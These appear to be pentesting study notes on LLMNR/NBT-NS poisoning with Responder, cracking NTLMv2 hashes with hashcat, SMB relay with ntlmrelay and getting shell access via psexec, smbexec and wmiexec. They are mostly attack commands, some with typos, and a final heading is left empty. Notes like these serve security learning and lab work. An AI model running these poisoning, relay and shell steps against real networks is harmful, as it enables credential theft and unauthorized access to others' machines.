- Link Local Multicast Name Resolution  
- Used to identify host when DNS fails.
- Previously NBT-NS
	NBT-NS, or NetBIOS Name Service, is an older protocol that facilitates name resolution in networks, especially when DNS servers are not available or do not provide suitable responses. It allows computers to register and resolve names to IP addresses using NetBIOS.
- Key flow is the services utilize a user's username and NTLM hash appropriately responded to  
##### Commands  

Responder
```bash 
responder -I etho -rdwv
hashcat -m 5600 ntlmhash.txt rockyou.txt
```

#### SMB Relay
Instead of cracking the hashes gathered with responder, we can instead relay those hashes to machines and potential gain access 

Requirements
Without SMB signing Enforced
Relayed user credential must be admin on machine

1. Identify the host which have smb disabled. 
   `nmap --script=smb2-security-mode.nse -p445 192.168.0.1/24`
2. Change the Responder config 
	```
	nano /etc/responder/Responder.conf
	SMB = off
	HTTP = off
	```
3.  Start the responder 
   `responder -I etho -rdwv`
4. Start the relay 
   `python ntmlrelay.py -tf target.txt -smbsupport`
   
   Use `-i` for the interactive shell 
   `python ntmlrelay.py -tf target.txt -smbsupport -i`

#### Get a shell access
There are fews ways 
1. Mfconsole use psexec - pass the smb useranme and password.
2. psexec.py - pass the smb useranme and password.
3. smbexec.py
4. wmiexec.py

#### Pass back attack on printers
